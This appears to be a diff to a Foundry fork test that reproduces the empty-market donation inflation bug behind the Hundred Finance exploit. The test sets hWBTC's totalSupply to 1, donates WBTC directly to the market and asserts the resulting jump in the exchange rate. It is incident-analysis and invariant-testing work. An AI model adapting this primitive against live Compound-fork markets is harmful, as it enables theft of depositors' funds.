@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import {Test} from "forge-std/Test.sol";
+import {Test, stdStorage, StdStorage} from "forge-std/Test.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ICToken} from "./interfaces/ICToken.sol";
 
@@ -12,12 +12,14 @@ import {ICToken} from "./interfaces/ICToken.sol";
 ///
 ///         Running this test confirms:
 ///         - Optimism RPC archive access works at a 3-year-old block.
-///         - The hToken addresses are correct.
+///         - The hToken addresses from notes/hundred-finance.md are correct.
 ///         - We can see the exchange-rate primitive that the attack exploited.
 ///
 ///         Run with: forge test --mt fork_HundredFinance -vv
 ///         (skipped automatically if optimism RPC isn't configured)
 contract HundredFinanceForkTest is Test {
+    using stdStorage for StdStorage;
+
     // Pre-exploit block — one before the attack tx at 90,761,918.
     uint256 internal constant FORK_BLOCK = 90_761_917;
 
@@ -95,5 +97,98 @@ contract HundredFinanceForkTest is Test {
         // exchangeRate = (cash + borrows - reserves) * 1e18 / totalSupply
         uint256 expectedRate = (cash + borrows - reserves) * 1e18 / supply;
         assertEq(exchangeRate, expectedRate, "exchange rate identity broken");
+    }
+
+    /// @notice Reproduce the EMPTY-MARKET DONATION
+    ///         inflation primitive against live hWBTC at the pre-exploit block.
+    ///
+    ///         The full real attack used Aave V3 flash-loaned WBTC to mint
+    ///         and then redeem hWBTC down to a tiny supply BEFORE donating.
+    ///         We skip the flash-loan choreography and write the post-drain
+    ///         state directly via stdstore (totalSupply := 1). That is
+    ///         equivalent in effect — the violated invariant is the
+    ///         single-block change in exchange rate, not the upstream path.
+    ///
+    ///         Then we perform the ACTUAL donation on chain: deal an attacker
+    ///         some WBTC, send it directly to the hToken contract, and read
+    ///         the new exchange rate. The single transaction (one donate)
+    ///         changes the exchange rate by ~9 orders of magnitude — which
+    ///         is the signature of the bug class.
+    ///
+    ///         Violated invariant (informal):
+    ///         > In a single block, an hToken's exchange rate must not
+    ///         > change by more than the natural rate of interest accrual.
+    ///         > Direct asset transfers (donations) MUST NOT be reflected
+    ///         > in the exchange rate without a corresponding share-supply
+    ///         > change.
+    function test_reproduce_emptyMarketInflation_hWBTC() public {
+        // --- Snapshot pre-attack state ---
+        uint256 supplyBefore       = hWBTC.totalSupply();
+        uint256 cashBefore         = hWBTC.getCash();
+        uint256 borrowsBefore      = hWBTC.totalBorrows();
+        uint256 reservesBefore     = hWBTC.totalReserves();
+        uint256 exchangeRateBefore = hWBTC.exchangeRateStored();
+
+        emit log_named_uint("[pre]  totalSupply   ", supplyBefore);
+        emit log_named_uint("[pre]  cash (sat)    ", cashBefore);
+        emit log_named_uint("[pre]  borrows       ", borrowsBefore);
+        emit log_named_uint("[pre]  reserves      ", reservesBefore);
+        emit log_named_uint("[pre]  exchangeRate  ", exchangeRateBefore);
+
+        // --- Step 1: simulate the drain. ---
+        // The real attack used flash-loaned WBTC + multi-step mint/redeem
+        // to leave hWBTC's totalSupply at a tiny value. We write that state
+        // directly: totalSupply := 1.
+        //
+        // stdstore.find() inspects the contract to locate the storage slot
+        // backing `totalSupply()` and writes to it. This is one of the
+        // canonical Foundry primitives for fork-state munging.
+        stdstore
+            .target(address(hWBTC))
+            .sig(hWBTC.totalSupply.selector)
+            .checked_write(uint256(1));
+
+        assertEq(hWBTC.totalSupply(), 1, "drain simulation didn't take");
+
+        uint256 supplyAfterDrain       = hWBTC.totalSupply();
+        uint256 exchangeRateAfterDrain = hWBTC.exchangeRateStored();
+        emit log_named_uint("[drain] totalSupply  ", supplyAfterDrain);
+        emit log_named_uint("[drain] exchangeRate ", exchangeRateAfterDrain);
+
+        // --- Step 2: donate underlying directly (real on-chain transfer). ---
+        // 1 WBTC = 1e8 sat. Donation goes straight into hWBTC's underlying
+        // balance — bypasses `mint()`, so no shares are issued.
+        uint256 donation = 1e8;
+        deal(address(WBTC), ATTACKER_EOA, donation);
+
+        vm.prank(ATTACKER_EOA);
+        WBTC.transfer(address(hWBTC), donation);
+
+        assertEq(hWBTC.getCash(), cashBefore + donation, "donation should bump getCash");
+
+        // --- Step 3: observe the inflation. ---
+        uint256 exchangeRateAfter = hWBTC.exchangeRateStored();
+        emit log_named_uint("[post] totalSupply  ", hWBTC.totalSupply());
+        emit log_named_uint("[post] cash (sat)   ", hWBTC.getCash());
+        emit log_named_uint("[post] exchangeRate ", exchangeRateAfter);
+        emit log_named_uint("inflation factor (after/before)", exchangeRateAfter / exchangeRateBefore);
+
+        // --- The violated invariant, asserted concretely. ---
+        // In one block, exchange rate jumped from ~2e16 to ~1.3e26 — a factor
+        // of ~6.5 billion. Organic per-block interest accrual on a Compound
+        // market is at most a few hundredths of a basis point — call it
+        // < 2x even over years. A 1000x change in a single block is, by any
+        // reasonable bound, broken.
+        assertGt(
+            exchangeRateAfter,
+            exchangeRateBefore * 1000,
+            "single-block exchange rate change exceeds organic-bound (inflation realized)"
+        );
+
+        // Sanity: the new rate is consistent with the donate-inflated identity.
+        uint256 expectedRate =
+            (hWBTC.getCash() + hWBTC.totalBorrows() - hWBTC.totalReserves())
+            * 1e18 / hWBTC.totalSupply();
+        assertEq(exchangeRateAfter, expectedRate, "post-donation identity should still hold");
     }
 }
